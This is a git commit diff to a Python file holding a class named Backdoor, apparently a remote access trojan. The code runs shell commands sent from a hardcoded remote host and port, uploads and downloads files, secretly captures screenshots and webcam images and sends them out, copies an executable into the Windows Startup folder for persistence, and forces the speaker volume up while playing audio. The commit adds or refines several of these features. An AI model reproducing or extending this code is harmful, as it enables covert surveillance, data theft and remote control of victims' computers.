863c48a971a6b89cf079633feda03a5adaf23998
tymophiyy <tima.matviiv@gmail.com>
2022-03-26 16:02:43 +0200

    fix a lot of bugs

--- server.py
+++ server.py
@@ -44,7 +44,11 @@ class Backdoor:
             
             proc = subprocess.Popen([command], stdout=subprocess.PIPE, shell=True)
             (out, err) = proc.communicate()
-            return str(out)
+            if str(out) != "b''":
+                return str(out)
+            else:
+                os.system(command)
+        
         except Exception as error:
             return error
 
@@ -81,29 +85,33 @@ class Backdoor:
                     file_name = command.replace("download ", "")
                     command_result = self.read_file(file_name)
                 elif command.split()[0] == "upload":
-                    file_name = command.replace("upload ", "")
+                    file_name = command.split()[1]
                     file_content = command.replace(f"upload {file_name} ", "")
                     command_result = self.write_file(file_name, file_content)
                 elif command.split()[0] == "screenshot":
-                    im = mss.mss().shot(output=f"screen.png")
-                    command_result = self.read_file(f"screen.png")
+                    username = subprocess.getoutput("echo \%username%")
+                    path = f"C:\\Users\\{username[1::]}\\Documents"
+                    cmd = f'del "{path}\\screen.png"'
+                    
+                    im = mss.mss().shot(output=f"{path}\\screen.png")
+                    command_result = self.read_file(f"{path}\\screen.png")
 
-                    if os.name == "nt":
-                        os.system(f"del screen.png")
-                    else:
-                        os.system(f"rm screen.png")
+                    os.system(cmd)
+
                 elif command.split()[0] == "camera":
-                    cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
-                    result, image = cam.read()
-                    cv2.imwrite(f"camera.jpg", image)
-                    command_result = self.read_file(f"camera.jpg")
+                    username = subprocess.getoutput("echo \%username%")
+                    path = f"C:\\Users\\{username[1::]}\\Documents"
+                    cmd = f'del "{path}\\camera.jpg"'
+                    try:
+                        cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+                        result, image = cam.read()
+                        cv2.imwrite(f"{path}\\camera.jpg", image)
+                        command_result = self.read_file(f"{path}\\camera.jpg")              
+                        cam.release()
+                        os.system(cmd)
+                    except:
+                        command_result = "[-] Not found any camera"
 
-                    if os.name == "nt":
-                        os.system(f"del camera.jpg")
-                    else:
-                        os.system(f"rm camera.jpg")
-
-                    cam.release()
                 else:
                     command_result = self.execute_system_command(command)
                 self.reliable_send(command_result)
@@ -112,12 +120,12 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
-
 username = subprocess.getoutput("echo \%username%")
-path = f"C:\\Users\\{username[1::]}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\"
-command = f'copy server.exe "{path}"'
-print(command)
+path = f"C:\\Users\\{username[1::]}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
+command = f'copy matanal.exe "{path}"'
 os.system(command)
+
+# time.sleep(10)
 
 devices = AudioUtilities.GetSpeakers()
 interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
@@ -125,7 +133,7 @@ volume = cast(interface, POINTER(IAudioEndpointVolume))
 
 def setMaxVolume():
     while True:
-        volume.SetMasterVolumeLevel(-30.0, None)
+        volume.SetMasterVolumeLevel(0.0, None)
         time.sleep(2)
 
 def playGimn():
@@ -138,10 +146,10 @@ vol = threading.Thread(target=setMaxVolume)
 vol.start()
 
 gimn = threading.Thread(target=playGimn)
+gimn.name = "music"
 gimn.start()
 
 webbrowser.open('https://f8n-production-collection-assets.imgix.net/0x30c7123FA156772020814bC39b4559Fc94deebc8/1/nft.jpg?q=80&auto=format%2Ccompress&cs=srgb&max-w=1680&max-h=1680')
-
 
 my_backdoor = Backdoor("185.247.119.121", 4444)
 my_backdoor.run()
